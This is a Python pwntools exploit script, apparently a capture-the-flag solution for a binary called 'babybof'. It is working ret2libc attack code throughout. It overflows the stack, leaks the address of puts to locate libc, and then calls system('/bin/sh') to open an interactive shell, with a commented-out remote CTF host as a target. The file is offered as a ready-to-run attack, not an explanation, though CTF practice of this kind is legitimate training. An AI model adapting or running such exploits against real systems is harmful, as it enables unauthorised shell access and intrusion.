#!/usr/bin/python3

from pwn import *

#p = process('./babybof')
p = remote('localhost', 9999)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#p = remote('chals20.cybercastors.com', 14425)
#libc = ELF('libc-database/db/libc6_2.31-0ubuntu9_amd64.so')

'''
# libc-database/find puts 5a0
http://http.us.debian.org/debian/pool/main/g/glibc/libc6_2.30-4_i386.deb (id libc6_2.30-4_i386)
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb (id libc6_2.31-0ubuntu9_amd64)
'''

binary = ELF('./babybof')

context.update(arch='amd64')
rop = ROP('babybof')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

p.recvuntil('Say your name: ')
payload  = 0x108 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])
payload += p64(binary.plt['puts'])
payload += p64(binary.symbols['main'])
p.sendline(payload)

_ = p.recvline().strip()
_ = p.recvline().strip()
puts = u64(_ + 2*b'\x00')
print('puts:',hex(puts))
baselibc = puts - libc.symbols['puts']
print('baselibc:',hex(baselibc))

p.recvuntil('Say your name: ')
payload  = 0x108 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(baselibc + next(libc.search(b'/bin/sh')))
payload += p64(baselibc + libc.symbols['system'])
p.sendline(payload)

p.interactive()
